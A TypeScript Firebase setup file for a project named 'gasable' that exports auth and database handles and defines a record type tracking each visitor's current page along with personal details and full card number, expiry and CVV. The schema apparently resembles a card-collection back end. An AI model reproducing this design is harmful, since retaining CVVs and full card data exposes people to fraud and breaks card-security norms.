import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyD4UvosjCOmBVgpwgXc9ox4BTR2V0imSmY",
  authDomain: "gasable-3738e.firebaseapp.com",
  databaseURL: "https://gasable-3738e-default-rtdb.firebaseio.com",
  projectId: "gasable-3738e",
  storageBucket: "gasable-3738e.firebasestorage.app",
  messagingSenderId: "794716070371",
  appId: "1:794716070371:web:835ba8720377a09ad640d6",
  measurementId: "G-F88P7B5192"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

